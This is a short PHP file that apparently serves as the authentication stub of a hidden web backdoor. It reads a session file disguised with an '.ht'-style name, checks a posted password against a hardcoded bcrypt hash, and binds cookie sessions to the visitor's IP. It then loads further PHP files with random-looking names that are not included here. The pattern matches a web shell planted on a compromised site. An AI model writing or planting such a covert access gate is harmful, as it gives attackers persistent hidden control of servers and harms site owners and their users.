
<?php

ob_start( );

function k313_main($sfile)
{
  static $one_off = false;
  
  if (! $one_off) {
    $one_off = true;
    if (define('K313DIR', __DIR__.'/')) {
      $sessfile = K313DIR.$sfile;
      if (is_file($sessfile) && filesize($sessfile)) {
        ini_set('display_errors', 1);
        error_reporting(-1);
        $time = time( );
        $arr = file($sessfile);
        if (isset ($arr[0])) {
          $keys = explode(',', trim($arr[0]));
          if (6 === count($keys)) {
            $inclkey = array_pop($keys);
            $sesscook = array_pop($keys);
            $salt = array ('4R.', 'qQ0o', '..c', '-S-y');
            if (isset ($_POST[$keys[0]])) {
              if (filemtime($sessfile) < $time - 15) {
                include_once K313DIR.'dszez47dhcbs7384d.php';
                $hash = '$2y$10$VeqMtvbSli.jG1SDd5C1WeqzbQLGe7vPqEDQg3XYYL1PgOJbaaGKi';
                k313_login($sessfile, $sesscook, $keys, $salt, $hash);
              }
            }
            elseif (isset ($_COOKIE[$sesscook])) {
              $sid = $_COOKIE[$sesscook];
              if (is_string($sid)) {
                $salt = implode('', $salt);
                $count = count($arr);
                while (--$count > 0) {
                  $line = trim($arr[$count]);
                  if ($time <= substr($line, 0, 10)) {
                    if (substr($line, 10, 32) === md5($sid.$salt.$_SERVER['REMOTE_ADDR'])) {
                      include_once K313DIR.'u30sE1N7BBo3aY.php';
                      k313_flush(substr($line, 42), $sid.$salt, $inclkey);
                      break;
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}

k313_main('.ht3748aal1le9eur4nS8q');
